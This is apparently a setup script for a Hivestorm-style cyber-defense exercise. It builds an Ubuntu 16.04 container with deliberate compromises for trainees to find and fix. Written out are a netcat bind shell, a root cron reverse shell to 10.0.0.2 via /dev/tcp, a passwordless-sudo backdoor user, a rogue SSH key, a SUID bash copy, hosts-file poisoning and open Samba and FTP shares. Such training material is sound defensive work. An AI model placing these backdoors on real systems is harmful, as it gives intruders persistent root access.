#!/bin/bash
# Hivestorm HS20 scenario-02 — Ubuntu 16.04 misconfigurations + compromise.
set -euo pipefail

ROLES=/etc/sysrepair/roles.json

# Xenial is EOL; repo is on old-releases.
cat >/etc/apt/sources.list <<'EOF'
deb http://mirrors.kernel.org/ubuntu/ xenial main restricted universe multiverse
deb http://mirrors.kernel.org/ubuntu/ xenial-updates main restricted universe multiverse
deb http://mirrors.kernel.org/ubuntu/ xenial-security main restricted universe multiverse
EOF

apt-get update
apt-get install -y --no-install-recommends \
    jq sudo cron rsyslog procps iproute2 curl \
    openssh-server openssh-client sshpass \
    samba smbclient netcat-openbsd netcat-traditional telnet \
    telnetd vsftpd ftp \
    libpam-pwquality

ADMIN=$(jq -r .admin_user           "$ROLES")
ADMIN_PW=$(jq -r .admin_weak_password "$ROLES")
BACKDOOR=$(jq -r .backdoor_user     "$ROLES")
TROJAN=$(jq -r .trojan_path         "$ROLES")
SUID_PLANT=$(jq -r .suid_plant      "$ROLES")
CRON_PATH=$(jq -r .cron_path        "$ROLES")
PORT=$(jq -r .listener_port         "$ROLES")
POISONED=$(jq -r .poisoned_host     "$ROLES")
ROGUE_KEY=$(jq -r .rogue_authorized_key "$ROLES")
SHARE=$(jq -r .samba_share_name     "$ROLES")

# ---- users --------------------------------------------------------------------
useradd -m -s /bin/bash "$ADMIN"
echo "${ADMIN}:${ADMIN_PW}" | chpasswd
usermod -aG sudo "$ADMIN"

useradd -m -s /bin/bash "$BACKDOOR"
echo "${BACKDOOR}:changeme" | chpasswd
echo "${BACKDOOR} ALL=(ALL) NOPASSWD:ALL" >/etc/sudoers.d/90-${BACKDOOR}
chmod 0440 /etc/sudoers.d/90-${BACKDOOR}

# Wheel-style NOPASSWD on sudo group (unauthorized escalation).
echo "%sudo ALL=(ALL) NOPASSWD:ALL" >/etc/sudoers.d/99-sudo-nopw
chmod 0440 /etc/sudoers.d/99-sudo-nopw

# ---- unauthorized SSH key in admin's home ------------------------------------
ADMIN_HOME=$(getent passwd "$ADMIN" | cut -d: -f6)
mkdir -p "$ADMIN_HOME/.ssh"
printf '%s\n' "$ROGUE_KEY" >"$ADMIN_HOME/.ssh/authorized_keys"
chown -R "$ADMIN:$ADMIN" "$ADMIN_HOME/.ssh"
chmod 0700 "$ADMIN_HOME/.ssh"
chmod 0600 "$ADMIN_HOME/.ssh/authorized_keys"

# ---- /etc/hosts poisoning ----------------------------------------------------
# /etc/hosts is read-only at Docker build time — defer the append to the
# supervisor (hs-start.sh) where the runtime mount is writable.
mkdir -p /etc/sysrepair
printf '10.13.37.66\t%s\n' "$POISONED" >/etc/sysrepair/hosts-poison.fragment

# ---- PAM weak pwquality ------------------------------------------------------
# Leave /etc/pam.d/common-password without pam_pwquality enforcing minlen.
sed -ri 's/(pam_unix\.so\s+.*)(obscure|minlen=[0-9]+)//' /etc/pam.d/common-password || true

# ---- sysctl ------------------------------------------------------------------
cat >/etc/sysctl.d/99-hs-bad.conf <<'EOF'
kernel.dmesg_restrict=0
kernel.kptr_restrict=0
net.ipv4.conf.all.accept_redirects=1
EOF

# ---- trojan listener ---------------------------------------------------------
# Use nc.traditional (Ubuntu 16.04's nc.openbsd dropped -e for security, so the
# old listener silently failed). Trojan binary is nc.traditional renamed.
mkdir -p "$(dirname "$TROJAN")"
cp /bin/nc.traditional "$TROJAN"
chmod 0755 "$TROJAN"
cat >/usr/local/sbin/hs-backdoor.sh <<EOF
#!/bin/bash
while true; do
  /bin/nc.traditional -l -p $PORT -e /bin/bash || sleep 5
done
EOF
chmod 0755 /usr/local/sbin/hs-backdoor.sh

# ---- SUID plant --------------------------------------------------------------
mkdir -p "$(dirname "$SUID_PLANT")"
cp /bin/bash "$SUID_PLANT"
chmod 4755 "$SUID_PLANT"

# ---- rogue cron --------------------------------------------------------------
cat >"$CRON_PATH" <<EOF
*/5 * * * * root /bin/bash -c 'bash -i >& /dev/tcp/10.0.0.2/${PORT} 0>&1' >/dev/null 2>&1
EOF
chmod 0644 "$CRON_PATH"

# ---- samba guest-writable share ---------------------------------------------
mkdir -p /srv/samba/${SHARE}
chmod 0777 /srv/samba/${SHARE}
cat >>/etc/samba/smb.conf <<EOF

[${SHARE}]
   path = /srv/samba/${SHARE}
   browseable = yes
   guest ok = yes
   writeable = yes
   public = yes
EOF

# ---- unneeded services enabled ----------------------------------------------
# telnetd via inetd — enable inetd.conf line.
if [ -f /etc/inetd.conf ]; then
    sed -ri 's/^#\s*(telnet\s)/\1/' /etc/inetd.conf || true
fi
# vsftpd anon upload.
cat >/etc/vsftpd.conf <<'EOF'
listen=YES
anonymous_enable=YES
anon_upload_enable=YES
anon_mkdir_write_enable=YES
write_enable=YES
local_enable=YES
secure_chroot_dir=/var/run/vsftpd/empty
pam_service_name=vsftpd
EOF
# Keep the chroot root (ftp home) non-writable so vsftpd will serve,
# but expose a world-writable upload subdir — the classic misconfig.
mkdir -p /srv/ftp/upload
chown -R ftp:ftp /srv/ftp 2>/dev/null || true
chmod 0555 /srv/ftp
chmod 0777 /srv/ftp/upload
mkdir -p /var/run/vsftpd/empty

# ---- sshd --------------------------------------------------------------------
mkdir -p /var/run/sshd
sed -ri 's/^#?PermitRootLogin.*/PermitRootLogin yes/' /etc/ssh/sshd_config

# ---- supervisor --------------------------------------------------------------
cat >/usr/local/sbin/hs-start.sh <<'EOF'
#!/bin/bash
# Apply /etc/hosts poisoning now that the runtime mount is writable.
if [ -s /etc/sysrepair/hosts-poison.fragment ] \
   && ! grep -Fqf /etc/sysrepair/hosts-poison.fragment /etc/hosts 2>/dev/null; then
    cat /etc/sysrepair/hosts-poison.fragment >> /etc/hosts
fi
service rsyslog start    || true
service cron    start    || true
service smbd    start    || true
service nmbd    start    || true
service vsftpd  start    || true
/usr/local/sbin/hs-backdoor.sh &
exec /usr/sbin/sshd -D -e
EOF
chmod 0755 /usr/local/sbin/hs-start.sh

apt-get clean
rm -rf /var/lib/apt/lists/*
